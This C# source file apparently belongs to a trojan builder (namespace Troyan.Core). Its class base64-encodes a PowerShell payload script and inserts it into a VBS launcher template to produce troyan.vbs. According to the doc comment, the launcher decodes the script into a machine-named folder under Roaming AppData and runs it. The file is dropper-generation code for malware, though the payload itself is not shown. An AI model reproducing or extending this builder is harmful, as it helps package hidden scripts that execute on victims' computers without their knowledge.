using Commons;

namespace Troyan.Core;

/// <summary>Writes <c>troyan.vbs</c> with standard base64 of plain <c>body.debug.ps1</c> (decode to the same path as <c>Get-BodyPath</c>: Roaming AppData, sanitized <c>MachineName</c> folder and script basename, then run).</summary>
public sealed class TroyanPlainVbsEmitter : ITroyanPlainVbsEmitter
{
    public void Write(ServerLayoutPaths layout)
    {
        var templatePath = Path.Combine(layout.TroyanVbsDir, "launcher.vbs");
        if (!File.Exists(templatePath))
            throw new FileNotFoundException("launcher.vbs not found for plain VBS.", templatePath);

        var bodyPs1 = layout.BodyPs1Debug;
        if (!File.Exists(bodyPs1))
            throw new FileNotFoundException("body.debug.ps1 must be built before plain VBS.", bodyPs1);

        var b64 = Convert.ToBase64String(File.ReadAllBytes(bodyPs1));
        var template = File.ReadAllText(templatePath);
        const string placeholder = "0102";
        if (!template.Contains(placeholder, StringComparison.Ordinal))
            throw new InvalidOperationException("launcher.vbs must contain the 0102 placeholder.");

        var vbs = template.Replace(placeholder, b64, StringComparison.Ordinal);
        var dir = Path.GetDirectoryName(layout.TroyanOutputVbs);
        if (!string.IsNullOrEmpty(dir))
            Directory.CreateDirectory(dir);
        File.WriteAllText(layout.TroyanOutputVbs, vbs);
    }
}
